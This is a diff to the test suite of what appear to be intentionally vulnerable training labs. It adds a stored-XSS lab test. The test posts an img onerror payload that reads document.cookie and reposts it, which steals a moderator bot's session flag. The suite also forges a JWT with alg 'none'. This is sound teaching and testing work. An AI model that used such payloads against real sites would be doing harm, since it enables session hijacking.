@@ -1,5 +1,6 @@
-import { spawn, type ChildProcess } from 'node:child_process';
+import { spawn, spawnSync, type ChildProcess } from 'node:child_process';
 import { randomBytes } from 'node:crypto';
+import { existsSync } from 'node:fs';
 import { afterAll, describe, expect, it } from 'vitest';
 
 /**
@@ -9,13 +10,33 @@ import { afterAll, describe, expect, it } from 'vitest';
  */
 const running: ChildProcess[] = [];
 afterAll(() => {
-  for (const p of running) p.kill();
+  // Kill whole process trees: the XSS lab starts a browser that would outlive its parent.
+  for (const p of running) {
+    if (p.pid === undefined) continue;
+    if (process.platform === 'win32') spawnSync('taskkill', ['/pid', String(p.pid), '/T', '/F']);
+    else
+      try {
+        process.kill(-p.pid, 'SIGKILL');
+      } catch {
+        // already gone
+      }
+  }
 });
 
 async function lab(name: string, flag: string, extraEnv: Record<string, string> = {}): Promise<string> {
   const child = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', `labs/${name}/server.mjs`], {
-    env: { PATH: process.env.PATH, FLAG: flag, PORT: '0', HOST: '127.0.0.1', ...extraEnv },
+    // A minimal environment (no secrets of the test runner), plus what a browser needs on Windows.
+    env: {
+      PATH: process.env.PATH,
+      ...Object.fromEntries(['SystemRoot', 'TEMP', 'TMP', 'LOCALAPPDATA'].flatMap((k) => (process.env[k] ? [[k, process.env[k]]] : []))),
+      FLAG: flag,
+      PORT: '0',
+      HOST: '127.0.0.1',
+      ...extraEnv,
+    },
     stdio: ['ignore', 'pipe', 'inherit'],
+    // Own process group on POSIX, so afterAll can kill the lab and anything it started.
+    detached: process.platform !== 'win32',
   });
   running.push(child);
   const port = await new Promise<string>((resolve, reject) => {
@@ -44,7 +65,7 @@ const json = (body: unknown, token?: string) => ({
 const bearer = (token: string) => ({ headers: { authorization: `Bearer ${token}` } });
 
 describe('labs refuse to start without a flag', () => {
-  it.each(['sqli-login', 'idor-invoices', 'mass-assignment', 'ssrf-preview', 'path-traversal', 'command-injection', 'jwt-none'])('%s', async (name) => {
+  it.each(['sqli-login', 'idor-invoices', 'mass-assignment', 'ssrf-preview', 'path-traversal', 'command-injection', 'jwt-none', 'xss-stored'])('%s', async (name) => {
     const child = spawn(process.execPath, [`labs/${name}/server.mjs`], { env: { PATH: process.env.PATH }, stdio: 'ignore' });
     expect(await new Promise((resolve) => child.on('exit', resolve))).toBe(1);
   });
@@ -149,4 +170,35 @@ describe('lab jwt-none', () => {
     const res = (await (await fetch(`${base}/api/admin/secrets`, bearer(`${none}.${admin}.`))).json()) as { secret: string };
     expect(res.secret).toBe(flag);
   });
+});
+
+const chrome = [
+  process.env.CHROME_BIN,
+  'C:/Program Files/Google/Chrome/Application/chrome.exe',
+  '/usr/bin/google-chrome',
+  '/usr/bin/chromium',
+  '/usr/bin/chromium-browser',
+].find((p): p is string => p !== undefined && existsSync(p));
+
+// Needs a real browser (the moderator bot): present locally and on GitHub runners, checked in its container too.
+describe.skipIf(chrome === undefined)('lab xss-stored', () => {
+  it('the public page escapes; the moderation page runs the payload with the readable cookie of the bot', async () => {
+    const flag = newFlag();
+    const base = await lab('xss-stored', flag, { CHROME_BIN: chrome ?? '' });
+    const plain = new URLSearchParams({ auteur: 'moi', message: '<b>bonjour</b>' }).toString();
+    const post = (body: string) => fetch(`${base}/messages`, { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body, redirect: 'manual' });
+    expect((await post(plain)).status).toBe(303);
+    expect(await (await fetch(`${base}/`)).text()).toContain('&#60;b&#62;bonjour');
+    expect((await fetch(`${base}/admin/moderation`)).status).toBe(403);
+
+    // No route out of a lab: the payload sends the cookie back into the guestbook itself.
+    const payload = `<img src=x onerror="fetch('/messages',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'auteur=vol&message='+encodeURIComponent(document.cookie)})">`;
+    await post(new URLSearchParams({ auteur: 'moi', message: payload }).toString());
+    let page = '';
+    for (let i = 0; i < 40 && !page.includes(flag); i++) {
+      await new Promise((r) => setTimeout(r, 500));
+      page = await (await fetch(`${base}/`)).text();
+    }
+    expect(page).toContain(`session_moderateur=${flag}`);
+  }, 60_000);
 });
